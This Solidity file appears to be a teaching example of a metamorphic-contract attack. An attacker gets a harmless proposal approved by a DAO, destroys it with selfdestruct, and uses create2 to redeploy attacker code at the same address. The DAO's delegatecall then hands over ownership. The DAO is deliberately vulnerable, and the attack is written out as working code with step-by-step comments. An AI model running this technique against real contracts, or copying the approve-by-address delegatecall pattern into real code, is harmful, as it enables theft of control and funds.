// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/console.sol";
/**
 * Deploy Different Contracts at the Same Address
 * Contract address deployed with create is computed in the following way:
 *   contract address = last 20 bytes of sha3(rlp_encode(sender, nonce))
 * ... where sender is the address of the deployer and nonce is the number of transactions sent by sender.
 *
 * Hence it is possible to deploy different contracts at the same address if we can somehow reset the nonce.
 * Below is an example of how a DAO can be hacked.
 *
 * Called by Alice
 * 0. Deploy DAO
 *
 * Called by Attacker
 * 1. Deploy DeployerDeployer via create2
 * 2. Call DeployerDeployer.deploy() via create
 * ... addr = last 20 bytes of sha3(rlp(sender,nonce)), where nonce is the number of txn of sender
 * 3. Call Deployer.deployProposal()
 *
 * Called by Alice
 * 4. Get DAO approval of Proposal
 *
 * Called by Attacker
 * 5. Delete Proposal and Deployer contracts via selfdestruct()
 * 6. Re-deploy Deployer
 * 7. Call Deployer.deployAttack() ... as the proposal approved previously at the same address
 * 8. Call DAO.execute
 * 9. Check DAO.owner is attacker's address
 *
 * DAO -- approved --> Proposal
 * DeployerDeployer -- create2 --> Deployer -- create --> Proposal
 * DeployerDeployer -- create2 --> Deployer -- create --> Attack
 */

contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok,) = proposal.target.delegatecall(abi.encodeWithSignature("executeProposal()"));
        require(ok, "delegatecall failed");
    }
}

contract ProposalCtrt {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function destruct() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attacker {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external returns (address addr) {
        addr = address(new ProposalCtrt());
        emit Log(addr);
    }

    function deployAttack() external returns (address addr) {
        addr = address(new Attacker());
        emit Log(addr);
    }

    function destruct() external {
        selfdestruct(payable(address(0)));
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy(bytes32 _salt) external returns (address addr) {
        console.log("DeployerDeployer/deploy()...");
        addr = address(new Deployer{salt: _salt}());
        emit Log(addr);
    }

    function predictSaltedAddr(bytes32 _salt) public view returns (address) {
        return address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(this),
                            _salt,
                            keccak256(abi.encodePacked(type(Deployer).creationCode, abi.encode()))
                        )
                    )
                )
            )
        );
    }
}
